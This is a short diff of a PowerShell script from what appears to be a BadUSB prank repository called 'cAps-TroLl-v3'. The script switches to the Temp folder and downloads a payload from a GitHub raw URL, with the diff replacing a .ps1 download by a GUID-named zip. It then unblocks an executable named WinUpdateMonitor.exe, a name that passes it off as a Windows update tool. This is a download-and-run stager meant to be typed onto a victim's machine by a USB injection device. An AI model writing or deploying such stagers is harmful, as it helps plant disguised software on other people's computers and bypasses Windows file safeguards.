@@ -1,6 +1,7 @@
 cd $env:Temp;
 
-iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/raw.ps1 -O raw.ps1;
+iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip -O 258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip;
+
 Unblock-File -Path "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\WinUpdateMonitor.exe"
 
 
